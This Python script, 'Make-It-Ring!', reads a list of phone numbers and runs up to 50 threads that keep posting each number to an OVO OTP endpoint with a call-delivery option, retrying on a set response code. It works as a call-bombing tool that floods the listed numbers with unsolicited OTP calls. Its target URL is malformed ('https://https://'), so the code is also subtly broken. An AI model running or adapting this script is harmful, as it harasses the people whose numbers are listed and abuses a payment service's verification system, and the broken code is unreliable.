# -*- coding: utf-8 -*-
#   __  __________  __
#  /  |/  /  _/ _ \/ / | Make-It-Ring!
# / /|_/ // // , _/_/  | Author: P4kL0nc4t
#/_/  /_/___/_/|_(_)   | https://github.com/p4kl0nc4t

import _thread as thread  # Python 3 fix
import requests
import sys
import time

requests.packages.urllib3.disable_warnings()

print(r"""\
   __  __________  __
  /  |/  /  _/ _ \/ / | Make-It-Ring!
 / /|_/ // // , _/_/  | Author: P4kL0nc4t
/_/  /_/___/_/|_(_)   | https://github.com/p4kl0nc4t
""")

try:
    file = sys.argv[1]
except IndexError:
    print(f"usage: {sys.argv[0]} <numbers_list>")
    sys.exit(1)

with open(file, "r") as f:
    numbers = f.readlines()

count = 0
processc = 0
running_threads = 0
print_used = False
max_threads = 50

# Fungsi bantu
def trim_ident(ident):
    ident_l = len(str(ident))
    if ident_l % 2 == 0:
        return str(ident)
    else:
        return str(ident)[:ident_l - 1]

def prinfo(string):
    thread_idlen = len(str(trim_ident(thread.get_ident()))) + 2
    dash_c = thread_idlen - (len(string) + 2)
    dashes = int(dash_c / 2) * "-"
    return f"[{dashes}|{string}|{dashes}]"

print(f"{prinfo('info')}: read {len(numbers)} numbers from {file}")

def process(number):
    global running_threads, processc, print_used
    running_threads += 1
    number = number.strip()
    url = "https://https://ovo.id/oauth/otp"
    data = {"msisdn": number, "accept": "call"}
    headers = {"X-Requested-With": "XMLHttpRequest"}
    temp_code = "500001"

    try:
        while temp_code == "500001":
            r = requests.post(url, data=data, headers=headers, verify=False, timeout=10)
            json_data = r.json()
            temp_code = json_data.get('code', 'unknown')

        # Hindari race condition saat print
        while print_used:
            time.sleep(0.01)
        print_used = True
        print(f"\r[0x{trim_ident(thread.get_ident())}]: {number} (status: {temp_code})")
        print_used = False

    except Exception as e:
        print(f"[ERROR] {number} -> {e}")

    processc += 1
    running_threads -= 1
    return 1

# Jalankan thread
for number in numbers:
    number = number.strip()
    if not number or number.startswith(";"):
        continue
    while running_threads >= max_threads:
        time.sleep(0.05)
    count += 1
    thread.start_new_thread(process, (number,))

# Tunggu semua selesai
while processc != count:
    time.sleep(0.05)

print(f"{prinfo('done')}: done all jobs! exiting . . .")
sys.exit(0)
